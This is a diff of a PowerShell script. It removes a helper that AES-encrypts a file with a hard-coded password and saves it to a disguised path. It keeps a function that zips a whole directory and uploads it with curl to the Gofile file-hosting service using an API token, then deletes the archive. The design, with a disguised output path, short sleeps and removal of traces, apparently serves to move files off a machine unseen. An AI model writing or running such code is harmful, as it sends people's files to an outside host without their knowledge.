@@ -1,34 +1,4 @@
-function Protect-File {
-    param (
-        [string]$FilePath,
-        [string]$p
-    )
-    $soutpath="C:\ProgramX64\extentions\modi.rpm"
-    if (Test-Path $soutpath) { Remove-Item $soutpath -Force }
 
-    $Hasher = [System.Security.Cryptography.SHA256]::Create()
-    $Key = $Hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($p))
-    
-
-    $Aes = [System.Security.Cryptography.Aes]::Create()
-    $Aes.Key = $Key
-    $Aes.GenerateIV() # Create a random 'starting' jump for the encryption
-    $IV = $Aes.IV
-
-
-    $RawBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $Encryptor = $Aes.CreateEncryptor()
-    $EncryptedBytes = $Encryptor.TransformFinalBlock($RawBytes, 0, $RawBytes.Length)
-
-
-    $FinalOutput = New-Object Byte[] ($IV.Length + $EncryptedBytes.Length)
-    [Array]::Copy($IV, 0, $FinalOutput, 0, $IV.Length)
-    [Array]::Copy($EncryptedBytes, 0, $FinalOutput, $IV.Length, $EncryptedBytes.Length)
-    
-    [System.IO.File]::WriteAllBytes($soutpath, $FinalOutput)
-    return $soutpath
-    
-}
 function Upload-direToGofile {
     param (
         [string]$Path,
@@ -46,14 +16,14 @@ function Upload-direToGofile {
         
 
         Compress-Archive -Path "$Path\*" -DestinationPath $zipPath -Force
-        $finalpathto=Protect-File -FilePath $zipPath -p "wajih2017."
+       
 
         
         
-        curl.exe -F "file=@$finalpathto" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
+        curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
         Start-Sleep -Milliseconds 30
         Remove-Item $zipPath -Force
-        Remove-Item $finalpathto -Force
+        
         
         Start-Sleep -Milliseconds 30
             
